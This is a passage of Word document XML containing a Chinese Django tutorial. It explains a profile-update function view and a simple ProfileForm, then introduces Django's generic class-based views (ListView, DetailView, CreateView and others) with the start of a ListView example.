        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794D0966" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = ProfileForm(default_data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D065844" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4487CE88" w14:textId="1B6E9993" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'users/profile_update.html', {'form': form, 'user': user})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290B155E" w14:textId="77752DEC" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="293F8873" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>views.profile_update是如何工作的?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05625A54" w14:textId="09906986" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="293004FC" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们先从url获取user的主键pk(id), 利用get_object_or_404方法获取需要修改个人资料的用户对象user。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323C016D" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>当用户通过POST方法提交个人资料修改表单，我们利用is_valid()方法先验证表单ProfileForm的数据是否有效。如果有效，我们将更新过的first_name和last_name数据存入user对象。更新成功返回个人信息页。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430F902F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果用户没有提交表单或不是通过POST方法提交表单，我们先获取现有数据生成default_data，利用ProfileForm显示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471B2FE5" w14:textId="4C67741F" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79092F57" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ProfileForm实际上是非常简单的，包含了我们允许用户修改的字段。在这个案例里，我们没允许用户修改用户名和电子邮件，所以没有加进去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706A23EC" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># users/forms.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD62580" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EACA13" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B0C9C08" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ProfileForm(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266BBA0F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="237966DB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    first_name = forms.CharField(label='First Name', max_length=50, required=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DD92FA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    last_name = forms.CharField(label='Last Name', max_length=50, required=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660209D4" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="773FFA8E" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>基于函数的视图(Function Based View)和基于类的视图(Class Based View)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7C130B" w14:textId="5F5C54D0" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EF377C4" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的视图有两种: 基于函数的视图(Function Base View)和基于类的视图(Class Based View)。上述案例中的index，article_detail和profile_update的方法都是基于函数的视图。优点是直接，容易读者理解。缺点是不便于继承和重用。在实际Web开发过程中，我们对不同的对象总是反复进行以下同样的操作，应该需要简化的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D469444" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>展示对象列表（比如所有用户，所有文章）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B2A421" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>查看某个对象的详细信息（比如用户资料，比如文章详情)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4F855E" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过表单创建某个对象（比如创建用户，新建文章）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BC38E5" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过表单更新某个对象信息（比如修改密码，修改文字内容）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DF898E" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户填写表单提交后转到某个完成页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31ACB054" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>删除某个对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F552A4" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06704C67" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django提供了很多通用的基于类的视图(Class Based View)，来帮我们简化视图的编写。这些View与上述操作的对应关系如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2FB156" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>展示对象列表（比如所有用户，所有文章）- ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B2E045" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>展示某个对象的详细信息（比如用户资料，比如文章详情) - DetailView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E52A176" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过表单创建某个对象（比如创建用户，新建文章）- CreateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7309295F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>通过表单更新某个对象信息（比如修改密码，修改文字内容）- UpdateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418504F1" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户填写表单后转到某个完成页面 - FormView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622D2A69" w14:textId="5F63A2E1" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>删除某个对象 - DeleteView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFEB89B" w14:textId="1EAFF556" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上述常用通用视图一共有6个，前2个属于展示类视图(Display view), 后面4个属于编辑类视图(Edit view)。下面我们就来看下这些通用视图是如何工作的，如何简化我们代码的。一旦你用上通用视图，你就会爱上她。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E910AC9" w14:textId="391A37B5" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>重要：如果你要使用Edit view，请务必在</w:t>
      </w:r>
      <w:hyperlink r:id="rId242" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>模型models</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>里定义get_absolute_url()方法，否则会出现错误。这是因为通用视图在对一个对象完成编辑后，需要一个返回链接。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D3C4F7" w14:textId="54D350F9" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django通用视图之ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0537F27A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ListView用来展示一个对象的列表。它只需要一个参数模型名称即可。比如我们希望展示所有文章列表，我们的views.py可以简化为:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD99928" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6C06CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic import ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1664BF6C"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346C1302" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F6A0822" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class IndexView(ListView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C380E3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E5DF561" w14:textId="21C6FC23" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059B79E3" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上述代码等同于:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F2B269" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
